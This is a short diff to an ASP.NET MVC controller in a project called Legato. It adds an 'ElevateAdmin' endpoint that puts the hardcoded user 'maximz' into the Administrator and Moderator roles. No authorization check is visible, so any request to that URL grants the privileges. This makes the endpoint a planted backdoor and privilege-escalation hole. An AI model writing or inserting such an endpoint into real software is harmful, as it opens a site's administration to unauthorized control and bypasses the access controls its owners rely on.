@@ -184,5 +184,13 @@ namespace Legato.Controllers
         {
             return Content(Current.RevNumber());
         }
+
+        [Url("ElevateAdmin")]
+        public virtual ActionResult ElevateMaximToAdmin()
+        {
+            System.Web.Security.Roles.AddUserToRole("maximz", RoleNames.Administrator);
+            System.Web.Security.Roles.AddUserToRole("maximz", RoleNames.Moderator);
+            return Content("done for maximz");
+        }
     }
 }
